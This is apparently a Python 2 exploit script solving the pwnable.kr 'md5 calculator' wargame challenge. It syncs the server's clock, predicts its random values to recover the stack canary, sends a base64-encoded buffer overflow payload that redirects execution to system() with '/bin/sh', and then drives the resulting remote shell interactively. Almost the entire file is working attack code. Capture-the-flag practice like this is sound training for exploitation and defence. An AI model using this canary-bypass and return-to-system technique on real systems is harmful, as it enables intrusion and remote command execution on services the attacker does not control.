import os, sys, socket
import base64, struct
import time
import subprocess

# we want to time this so the date is received at the esact same time as the md5_calcualtor service is run
# socket to receieve time
t_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# socket to run service
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

t_s.connect(('pwnable.kr', 80))
s.connect(("pwnable.kr", 9002))
t_s.send('GET / HTTP/1.0\r\n\r\n')
t = t_s.recv(64).split('\n')[1]
t_s.close()
t = t[11:-1]
p = '%d %b  %Y %H:%M:%S %Z'
s_epoch = int(time.mktime(time.strptime(t,p)))


# Get random integers seeded at same time
x = subprocess.Popen(['/home/raw/Documents/pwnable/rookis/md5_calculator/c_random2', str(s_epoch)], stdout=subprocess.PIPE)
output = x.communicate()[0].split("\n")

for i in range(0,8):
	exec('rand_int_' + str(i) + ' = int(output[' + str(i) + '])')
#	print "random integer " + str(i) + " = " + str(output[i])

data = ""
while "captcha" not in data:
	data = s.recv(512)
	print data


captcha_value = int(data[data.find(":")+1:])
s.send((str(captcha_value)+"\r\n"))

data = ""
while "BASE64" not in data:
	data = s.recv(512)
	print data


# calculate canary
canary_value = captcha_value - (rand_int_1 + rand_int_5) - (rand_int_2 - rand_int_3) - (rand_int_4 - rand_int_6) - rand_int_7
canary_value = canary_value & 0xffffffff

# Create payload
eip_offset = 524 
canary_offset = eip_offset-12
buffer_address = 0x804b0e0 + 716
system_address = 0x08049187

# fill array
payload = "A"*(canary_offset)
payload += struct.pack("I",canary_value)
payload += "A"*(eip_offset - canary_offset)
payload += struct.pack("I",system_address)
payload += struct.pack("I",buffer_address)

# encode payload in base64
payload = base64.b64encode(payload)

# append system argument
payload += "/bin/sh\x00" 
payload += "\r\n"

 
# send payload
s.send(payload)

data = ""
while "MD5" not in data:
	data = s.recv(512)
	print 


s.settimeout(0.5)
while(True):
	try:
		data = s.recv(512)
		sys.stdout.write(data)
	except socket.error:
		s.send(raw_input() + "\n")







